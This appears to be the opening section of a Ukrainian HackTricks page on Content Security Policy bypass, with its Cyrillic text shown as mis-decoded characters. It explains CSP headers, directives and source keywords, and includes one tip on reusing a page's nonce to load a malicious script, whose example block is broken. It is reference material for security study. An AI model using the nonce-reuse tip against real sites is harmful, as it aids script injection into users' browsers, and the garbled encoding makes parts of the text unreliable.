# Content Security Policy (CSP) Bypass

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ –º–∏—Å–ª–∏–≤—Ü—è–º–∏ –∑–∞ –±–∞–≥–∞–º–∏!

**–Ü–Ω—Å–∞–π—Ç–∏ —â–æ–¥–æ —Ö–∞–∫—ñ–Ω–≥—É**\
–í–∑–∞—î–º–æ–¥—ñ–π—Ç–µ –∑ –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º, —è–∫–∏–π –¥–æ—Å–ª—ñ–¥–∂—É—î –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ —Ö–∞–∫—ñ–Ω–≥ —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ —à–≤–∏–¥–∫–æ–∑–º—ñ–Ω–Ω–æ–≥–æ —Å–≤—ñ—Ç—É —Ö–∞–∫—ñ–Ω–≥—É –∑–∞–≤–¥—è–∫–∏ –Ω–æ–≤–∏–Ω–∞–º —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∞–º —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–∞–π–Ω–æ–≤—ñ—à–∏—Ö –±–∞–≥-–±–∞—É–Ω—Ç—ñ, —è–∫—ñ –∑–∞–ø—É—Å–∫–∞—é—Ç—å—Å—è, —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏

**–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞** [**Discord**](https://discord.com/invite/N3FrSbmwdy) —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –Ω–∞–π–∫—Ä–∞—â–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

## –©–æ —Ç–∞–∫–µ CSP

–ü–æ–ª—ñ—Ç–∏–∫–∞ –±–µ–∑–ø–µ–∫–∏ –∫–æ–Ω—Ç–µ–Ω—Ç—É (CSP) –≤–∏–∑–Ω–∞–Ω–∞ —è–∫ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—è –±—Ä–∞—É–∑–µ—Ä–∞, —Å–ø—Ä—è–º–æ–≤–∞–Ω–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –Ω–∞ **–∑–∞—Ö–∏—Å—Ç –≤—ñ–¥ –∞—Ç–∞–∫, —Ç–∞–∫–∏—Ö —è–∫ –º—ñ–∂—Å–∞–π—Ç–æ–≤–∏–π —Å–∫—Ä–∏–ø—Ç—ñ–Ω–≥ (XSS)**. –í–æ–Ω–∞ –ø—Ä–∞—Ü—é—î —à–ª—è—Ö–æ–º –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∞ –¥–µ—Ç–∞–ª—ñ–∑–∞—Ü—ñ—ó —à–ª—è—Ö—ñ–≤ —Ç–∞ –¥–∂–µ—Ä–µ–ª, –∑ —è–∫–∏—Ö –±—Ä–∞—É–∑–µ—Ä –º–æ–∂–µ –±–µ–∑–ø–µ—á–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ä–µ—Å—É—Ä—Å–∏. –¶—ñ —Ä–µ—Å—É—Ä—Å–∏ –æ—Ö–æ–ø–ª—é—é—Ç—å —Ä—ñ–∑–Ω–æ–º–∞–Ω—ñ—Ç–Ω—ñ –µ–ª–µ–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, —Ñ—Ä–µ–π–º–∏ —Ç–∞ JavaScript. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–æ–ª—ñ—Ç–∏–∫–∞ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª—è—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤ –∑ —Ç–æ–≥–æ –∂ –¥–æ–º–µ–Ω—É (self), –≤–∫–ª—é—á–∞—é—á–∏ –≤–±—É–¥–æ–≤–∞–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏ —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ä—è–¥–∫–æ–≤–æ–≥–æ –∫–æ–¥—É —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ `eval`, `setTimeout` –∞–±–æ `setInterval`.

–†–µ–∞–ª—ñ–∑–∞—Ü—ñ—è CSP –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏—Ö –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤** –∞–±–æ —à–ª—è—Ö–æ–º –≤–∫–ª—é—á–µ–Ω–Ω—è **–º–µ—Ç–∞-–µ–ª–µ–º–µ–Ω—Ç—ñ–≤ —É HTML-—Å—Ç–æ—Ä—ñ–Ω–∫—É**. –í—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ —Ü—ñ—î—ó –ø–æ–ª—ñ—Ç–∏–∫–∏, –±—Ä–∞—É–∑–µ—Ä–∏ –∞–∫—Ç–∏–≤–Ω–æ –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—Ç—å —Ü—ñ —É–º–æ–≤–∏ —Ç–∞ –Ω–µ–≥–∞–π–Ω–æ –±–ª–æ–∫—É—é—Ç—å –±—É–¥—å-—è–∫—ñ –≤–∏—è–≤–ª–µ–Ω—ñ –ø–æ—Ä—É—à–µ–Ω–Ω—è.

```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```

* –†–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ —á–µ—Ä–µ–∑ –º–µ—Ç–∞-—Ç–µ–≥:

```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

### –ó–∞–≥–æ–ª–æ–≤–∫–∏

CSP –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–∏–π –∞–±–æ –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü–∏—Ö –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤:

* `Content-Security-Policy`: –ó–∞—Å—Ç–æ—Å–æ–≤—É—î CSP; –±—Ä–∞—É–∑–µ—Ä –±–ª–æ–∫—É—î –±—É–¥—å-—è–∫—ñ –ø–æ—Ä—É—à–µ–Ω–Ω—è.
* `Content-Security-Policy-Report-Only`: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É; –ø–æ–≤—ñ–¥–æ–º–ª—è—î –ø—Ä–æ –ø–æ—Ä—É—à–µ–Ω–Ω—è –±–µ–∑ —ó—Ö –±–ª–æ–∫—É–≤–∞–Ω–Ω—è. –Ü–¥–µ–∞–ª—å–Ω–æ –ø—ñ–¥—Ö–æ–¥–∏—Ç—å –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö –ø–µ—Ä–µ–¥ –≤–∏–ø—É—Å–∫–æ–º –≤ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é.

### –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –†–µ—Å—É—Ä—Å—ñ–≤

CSP –æ–±–º–µ–∂—É—î –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —è–∫ –∞–∫—Ç–∏–≤–Ω–æ–≥–æ, —Ç–∞–∫ —ñ –ø–∞—Å–∏–≤–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É, –∫–æ–Ω—Ç—Ä–æ–ª—é—é—á–∏ –∞—Å–ø–µ–∫—Ç–∏, —Ç–∞–∫—ñ —è–∫ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–±—É–¥–æ–≤–∞–Ω–æ–≥–æ JavaScript —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `eval()`. –ü—Ä–∏–∫–ª–∞–¥ –ø–æ–ª—ñ—Ç–∏–∫–∏:

```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```

### –î–∏—Ä–µ–∫—Ç–∏–≤–∏

* **script-src**: –î–æ–∑–≤–æ–ª—è—î –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è JavaScript, –≤–∫–ª—é—á–∞—é—á–∏ URL-–∞–¥—Ä–µ—Å–∏, –≤–±—É–¥–æ–≤–∞–Ω—ñ —Å–∫—Ä–∏–ø—Ç–∏, —Ç–∞ —Å–∫—Ä–∏–ø—Ç–∏, –≤–∏–∫–ª–∏–∫–∞–Ω—ñ –æ–±—Ä–æ–±–Ω–∏–∫–∞–º–∏ –ø–æ–¥—ñ–π –∞–±–æ —Ç–∞–±–ª–∏—Ü—è–º–∏ —Å—Ç–∏–ª—ñ–≤ XSLT.
* **default-src**: –í—Å—Ç–∞–Ω–æ–≤–ª—é—î —Ç–∏–ø–æ–≤—É –ø–æ–ª—ñ—Ç–∏–∫—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤, –∫–æ–ª–∏ –≤—ñ–¥—Å—É—Ç–Ω—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –¥–∏—Ä–µ–∫—Ç–∏–≤–∏ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è.
* **child-src**: –í–∫–∞–∑—É—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏ –¥–ª—è –≤–µ–±-—Ä–æ–±—ñ—Ç–Ω–∏–∫—ñ–≤ —Ç–∞ –≤–±—É–¥–æ–≤–∞–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É —Ñ—Ä–µ–π–º—ñ–≤.
* **connect-src**: –û–±–º–µ–∂—É—î URL-–∞–¥—Ä–µ—Å–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ fetch, WebSocket, XMLHttpRequest.
* **frame-src**: –û–±–º–µ–∂—É—î URL-–∞–¥—Ä–µ—Å–∏ –¥–ª—è —Ñ—Ä–µ–π–º—ñ–≤.
* **frame-ancestors**: –í–∫–∞–∑—É—î, —è–∫—ñ –¥–∂–µ—Ä–µ–ª–∞ –º–æ–∂—É—Ç—å –≤–±—É–¥–æ–≤—É–≤–∞—Ç–∏ –ø–æ—Ç–æ—á–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –¥–æ –µ–ª–µ–º–µ–Ω—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ `<frame>`, `<iframe>`, `<object>`, `<embed>`, —Ç–∞ `<applet>`.
* **img-src**: –í–∏–∑–Ω–∞—á–∞—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è –∑–æ–±—Ä–∞–∂–µ–Ω—å.
* **font-src**: –í–∫–∞–∑—É—î –¥—ñ–π—Å–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è —à—Ä–∏—Ñ—Ç—ñ–≤, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `@font-face`.
* **manifest-src**: –í–∏–∑–Ω–∞—á–∞—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ —Ñ–∞–π–ª—ñ–≤ –º–∞–Ω—ñ—Ñ–µ—Å—Ç—É –ø—Ä–æ–≥—Ä–∞–º–∏.
* **media-src**: –í–∏–∑–Ω–∞—á–∞—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–µ–¥—ñ–∞-–æ–±'—î–∫—Ç—ñ–≤.
* **object-src**: –í–∏–∑–Ω–∞—á–∞—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ `<object>`, `<embed>`, —Ç–∞ `<applet>`.
* **base-uri**: –í–∫–∞–∑—É—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ URL-–∞–¥—Ä–µ—Å–∏ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ `<base>`.
* **form-action**: –ü–µ—Ä–µ—Ä–∞—Ö–æ–≤—É—î –¥—ñ–π—Å–Ω—ñ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º.
* **plugin-types**: –û–±–º–µ–∂—É—î —Ç–∏–ø–∏ mime, —è–∫—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏.
* **upgrade-insecure-requests**: –ù–∞–∫–∞–∑—É—î –±—Ä–∞—É–∑–µ—Ä–∞–º –ø–µ—Ä–µ–ø–∏—Å—É–≤–∞—Ç–∏ HTTP-URL-–∞–¥—Ä–µ—Å–∏ –Ω–∞ HTTPS.
* **sandbox**: –ó–∞—Å—Ç–æ—Å–æ–≤—É—î –æ–±–º–µ–∂–µ–Ω–Ω—è, —Å—Ö–æ–∂—ñ –Ω–∞ –∞—Ç—Ä–∏–±—É—Ç sandbox `<iframe>`.
* **report-to**: –í–∫–∞–∑—É—î –≥—Ä—É–ø—É, —è–∫—ñ–π –±—É–¥–µ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ –∑–≤—ñ—Ç, —è–∫—â–æ –ø–æ–ª—ñ—Ç–∏–∫–∞ –ø–æ—Ä—É—à–µ–Ω–∞.
* **worker-src**: –í–∫–∞–∑—É—î –¥—ñ–π—Å–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è —Å–∫—Ä–∏–ø—Ç—ñ–≤ Worker, SharedWorker –∞–±–æ ServiceWorker.
* **prefetch-src**: –í–∫–∞–∑—É—î –¥—ñ–π—Å–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è —Ä–µ—Å—É—Ä—Å—ñ–≤, —è–∫—ñ –±—É–¥—É—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –∞–±–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ.
* **navigate-to**: –û–±–º–µ–∂—É—î URL-–∞–¥—Ä–µ—Å–∏, –Ω–∞ —è–∫—ñ –¥–æ–∫—É–º–µ–Ω—Ç –º–æ–∂–µ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç–∏ –±—É–¥—å-—è–∫–∏–º–∏ –∑–∞—Å–æ–±–∞–º–∏ (a, form, window.location, window.open, —Ç–æ—â–æ).

### –î–∂–µ—Ä–µ–ª–∞

* `*`: –î–æ–∑–≤–æ–ª—è—î –≤—Å—ñ URL-–∞–¥—Ä–µ—Å–∏, –∑–∞ –≤–∏–Ω—è—Ç–∫–æ–º —Ç–∏—Ö, —â–æ –º–∞—é—Ç—å —Å—Ö–µ–º–∏ `data:`, `blob:`, `filesystem:`.
* `'self'`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑ —Ç–æ–≥–æ –∂ –¥–æ–º–µ–Ω—É.
* `'data'`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤ —á–µ—Ä–µ–∑ —Å—Ö–µ–º—É –¥–∞–Ω–∏—Ö (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, –∑–∞–∫–æ–¥–æ–≤–∞–Ω—ñ Base64).
* `'none'`: –ë–ª–æ–∫—É—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑ –±—É–¥—å-—è–∫–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞.
* `'unsafe-eval'`: –î–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `eval()` —Ç–∞ –ø–æ–¥—ñ–±–Ω–∏—Ö –º–µ—Ç–æ–¥—ñ–≤, –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –∑ –ø–æ–≥–ª—è–¥—É –±–µ–∑–ø–µ–∫–∏.
* `'unsafe-hashes'`: –£–≤—ñ–º–∫–Ω—é—î –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –≤–±—É–¥–æ–≤–∞–Ω—ñ –æ–±—Ä–æ–±–Ω–∏–∫–∏ –ø–æ–¥—ñ–π.
* `'unsafe-inline'`: –î–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ –≤–±—É–¥–æ–≤–∞–Ω–∏–π `<script>` –∞–±–æ `<style>`, –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –∑ –ø–æ–≥–ª—è–¥—É –±–µ–∑–ø–µ–∫–∏.
* `'nonce'`: –ë—ñ–ª–∏–π —Å–ø–∏—Å–æ–∫ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö —Å–∫—Ä–∏–ø—Ç—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ—ñ—á–Ω–æ–≥–æ nonce (—á–∏—Å–ª–æ, —è–∫–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –æ–¥–∏–Ω —Ä–∞–∑).
* –Ø–∫—â–æ —É –≤–∞—Å –æ–±–º–µ–∂–µ–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è JS, –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π nonce –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `doc.defaultView.top.document.querySelector("[nonce]")` —Ç–∞ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç—É (—è–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è strict-dynamic, –±—É–¥—å-—è–∫–µ –¥–æ–∑–≤–æ–ª–µ–Ω–µ –¥–∂–µ—Ä–µ–ª–æ –º–æ–∂–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –Ω–æ–≤—ñ –¥–∂–µ—Ä–µ–ª–∞, —Ç–æ–º—É —Ü–µ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ), —è–∫ —É:

<details>

<summary>–ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å–∫—Ä–∏–ø—Ç, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ nonce –ø–æ–≤—Ç–æ—Ä–Ω–æ</summary>

\`\`\`html ![](https://github.com/carlospolop/hacktricks/blob/ua/pentesting-web/content-security-policy-csp-bypass/x) \`\`\`

</details>

* `'sha256-<hash>'`: –ë—ñ–ª—ñ—Å—Ç—É—î —Å–∫—Ä–∏–ø—Ç–∏ –∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º —Ö–µ—à–µ–º sha256.
* `'strict-dynamic'`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç–∏ –∑ –±—É–¥—å-—è–∫–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞, —è–∫—â–æ –≤–æ–Ω–∏ –±—É–ª–∏ –¥–æ–¥–∞–Ω—ñ –¥–æ –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é nonce –∞–±–æ —Ö–µ—à–∞.
* `'host'`: –í–∫–∞–∑—É—î –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π —Ö–æ—Å—Ç, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `example.com`.
* `https:`: –û–±–º–µ–∂—É—î URL-–∞–¥—Ä–µ—Å–∏ —Ç—ñ–ª—å–∫–∏ —Ç–∏–º–∏, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å HTTPS.
* `blob:`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ä–µ—Å—É—Ä—Å–∏ –∑ URL-–∞–¥—Ä–µ—Å Blob (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, URL-–∞–¥—Ä–µ—Å–∏ Blob, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é JavaScript).
* `filesystem:`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ä–µ—Å—É—Ä—Å–∏ –∑ —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏.
* `'report-sample'`: –í–∫–ª—é—á–∞—î –∑—Ä–∞–∑–æ–∫ –ø–æ—Ä—É—à–µ–Ω–æ–≥–æ –∫–æ–¥—É –≤ –∑–≤—ñ—Ç—ñ –ø—Ä–æ –ø–æ—Ä—É—à–µ–Ω–Ω—è (–∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è).
* `'strict-origin'`: –°—Ö–æ–∂–∏–π –Ω–∞ 'self', –∞–ª–µ –∑–∞–±–µ–∑–ø–µ—á—É—î –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ—Å—Ç—å —Ä—ñ–≤–Ω—è –±–µ–∑–ø–µ–∫–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª—É –¥–∂–µ—Ä–µ–ª –¥–æ–∫—É–º–µ–Ω—Ç—É (—Ä–µ—Å—É—Ä—Å–∏ –∑ –±–µ–∑–ø–µ—á–Ω–∏—Ö –¥–∂–µ—Ä–µ–ª –º–æ–∂—É—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ä–µ—Å—É—Ä—Å–∏ –∑ –±–µ–∑–ø–µ—á–Ω–∏—Ö –¥–∂–µ—Ä–µ–ª).
* `'strict-origin-when-cross-origin'`: –ù–∞–¥—Å–∏–ª–∞—î –ø–æ–≤–Ω—ñ URL-–∞–¥—Ä–µ—Å–∏ –ø—Ä–∏ –∑–¥—ñ–π—Å–Ω–µ–Ω–Ω—ñ –∑–∞–ø–∏—Ç—ñ–≤ –∑ –æ–¥–Ω–∞–∫–æ–≤–∏–º –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è–º, –∞–ª–µ –Ω–∞–¥—Å–∏–ª–∞—î –ª–∏—à–µ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è, –∫–æ–ª–∏ –∑–∞–ø–∏—Ç —î –º—ñ–∂–¥–æ–º–µ–Ω–Ω–∏–º.
